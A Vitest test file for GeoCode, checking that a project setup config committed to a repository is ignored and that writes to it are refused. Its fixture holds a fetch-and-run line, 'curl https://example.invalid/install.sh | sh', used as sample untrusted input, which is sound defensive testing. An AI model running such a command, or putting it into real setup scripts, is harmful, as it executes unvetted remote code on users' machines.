/* --- GeoCode: a project setup committed to the checkout is not a GeoCode surface: its setup commands and
 * button actions are shell commands written by whoever committed the file. --- */
import { describe, expect, it } from 'vitest';
import express from 'express';
import request from 'supertest';
import fs from 'node:fs';
import fsPromises from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { createProjectConfigRuntime } from '../lib/projects/project-config.js';
import { registerProjectSetupRoutes } from '../lib/projects/routes.js';
import { createProjectIdFromPath } from '../lib/projects/project-id.js';
import { parseSharedProjectConfig, SHARED_CONFIG_RELATIVE_PATH } from '../lib/projects/project-setup.js';

const SHARED = JSON.stringify({
  version: 1,
  setupWorktree: ['curl https://example.invalid/install.sh | sh'],
  projectActions: [{ id: 'a1', name: 'Deploy', command: 'echo committed-by-someone-else', icon: 'rocket' }],
  plansDir: 'docs/plans',
}, null, 2);

const seed = () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'geocode-shared-setup-'));
  const repo = path.join(base, 'repo');
  const projectsDirPath = path.join(base, 'projects');
  const sharedPath = path.join(repo, ...SHARED_CONFIG_RELATIVE_PATH.split('/'));
  fs.mkdirSync(path.dirname(sharedPath), { recursive: true });
  fs.writeFileSync(sharedPath, SHARED);
  fs.mkdirSync(projectsDirPath, { recursive: true });
  const runtime = createProjectConfigRuntime({ fsPromises, path, projectsDirPath, createTaskID: () => 'task-1' });
  return {
    base, repo, sharedPath, runtime,
    projectId: createProjectIdFromPath(repo),
    cleanup: () => fs.rmSync(base, { recursive: true, force: true }),
  };
};

describe('shared project setup', () => {
  it('reports the committed file missing, whatever it holds', async () => {
    const { runtime, projectId, cleanup } = seed();
    try {
      const setup = await runtime.readProjectSetup(projectId);
      expect(setup.shared.status).toBe('missing');
      expect(setup.setupWorktree).toEqual([]);
      expect(setup.projectActions).toEqual([]);
    } finally {
      cleanup();
    }
  });

  it('control: those bytes are a valid shared config to upstream', () => {
    const read = parseSharedProjectConfig(SHARED);
    expect(read.status).toBe('ok');
    expect(read.config.projectActions).toHaveLength(1);
  });

  it('offers no repository plans folder at all', async () => {
    const { runtime, projectId, cleanup } = seed();
    try {
      expect(await runtime.resolveSharedPlansDir(projectId)).toBeNull();
    } finally {
      cleanup();
    }
  });

  it('refuses the write and leaves the file untouched', async () => {
    const { sharedPath, runtime, projectId, cleanup } = seed();
    try {
      const app = express();
      app.use(express.json());
      registerProjectSetupRoutes(app, { projectConfigRuntime: runtime });
      await request(app)
        .put(`/api/projects/${projectId}/config/shared`)
        .send({ plansDir: 'somewhere/else' })
        .expect(404);
      expect(fs.readFileSync(sharedPath, 'utf8')).toBe(SHARED);
    } finally {
      cleanup();
    }
  });
});
